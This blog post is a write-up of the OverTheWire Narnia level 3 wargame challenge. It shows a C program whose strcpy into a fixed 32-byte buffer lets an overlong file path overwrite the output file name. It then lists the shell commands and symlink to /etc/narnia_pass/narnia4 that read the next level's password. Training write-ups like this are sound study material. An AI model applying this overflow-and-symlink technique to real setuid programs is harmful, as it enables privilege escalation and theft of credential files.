---
layout:     post
title:      "Overthewire.org - Narnia 3 -> 4"
subtitle:   "Write-Up"
date:       2017-02-28 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
category: Write-Ups
---

<h1>Introduction</h1>

<p>Let's go back to another reverse engineering challenge from OverTheWire. This time we'll be dealing with a little different type of buffer overflow.  </p>

<h1>Challenge</h1>

<p>This time, let's start the program firstly. </p>

{% highlight text %}
narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
{% endhighlight %}

<p>Now let's take a look at the source code. </p>

{% highlight c %}
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
{% endhighlight %}

<p>This code may look complicated at the first. But, after taking a closer look, we can see a potential buffer overflow vulnerability in <b>ifile</b> buffer, which is 32 bytes in size. </p>

<p>Because <b>strcpy()</b> does not perform any checks of the length of the input, if I give a file name longer than 32 bytes in length, I would be able to overwrite the <b>ofile</b> from <b>/dev/null</b> to another file. </p>

<p>It's known bug in the strcpy man pages: </p>

<p><i>If the destination string of a strcpy() is not large enough, then  anything  might  happen.   Overflowing  fixed-length  string  buffers is a favorite cracker technique for taking complete control of the  machine. Any  time  a  program  reads  or copies data into a buffer, the program first needs to check that there's enough space.  This may  be  unnecessary  if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make  the  impossible possible.</i></p>

<p>Firstly, I'm going to create a file in <b>/tmp</b> directory, where possibly, the password for the next level will end up.  </p>

{% highlight text %}
narnia3@melinda:~$ cd /tmp
narnia3@melinda:/tmp$ touch w3ndige
{% endhighlight %}

<p>Then, I'm going to use Python, and calculate how long the directory should be, together with <b>/tmp/</b> beggining. We can also generate letters for our directory name. </p>

{% highlight python %}
>>> 32 - len("/tmp/")
27
>>> print("/tmp/" + "A"*27)
/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA
{% endhighlight %}

<p>Now, let's move on and create a directory. But because its name will only fulfill the buffer, we have to add another one, which will overwrite the buffer. </p>

{% highlight text %}
narnia3@melinda:/tmp$ mkdir AAAAAAAAAAAAAAAAAAAAAAAAAAW     
narnia3@melinda:/tmp$ cd AAAAAAAAAAAAAAAAAAAAAAAAAAW
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW$ mkdir tmp
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW$ cd tmp
{% endhighlight %}

<p>Now we can create a link using <b>ln</b> command on w3ndige file, to the password file. This means that when we cat the created file, it will actually cat the content of the password file “/etc/narnia_pass/narnia4”. We can also see, if it works, using <b>ls</b> command.  </p>

{% highlight text %}
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ ln -s /etc/narnia_pass/narnia4 ./w3ndige
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ ls -lh
total 0
lrwxrwxrwx 1 narnia3 narnia3 24 Feb 28 20:18 w3ndige -> /etc/narnia_pass/narnia4

{% endhighlight %}

<p>Now we have to pass this directory, as an argument, to the binary. Let's pray it works. </p>

{% highlight text %}
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp/w3ndige
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp/w3ndige to a safer place... (/tmp/w3ndige)
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ cat /tmp/w3ndige
**********
{% endhighlight %}

<p>And it worked, now we have the password! </p>

<h1>Conclusion</h1>
<p>Once gain thanks <a href="http://overthewire.org/wargames/">OverTheWire</a>! I'm definitely looking forward to new challenges from <b>Narnia</b>, as I'm getting more and more interested in reverse engineering. </p>

<p>~ Stay safe!</p>
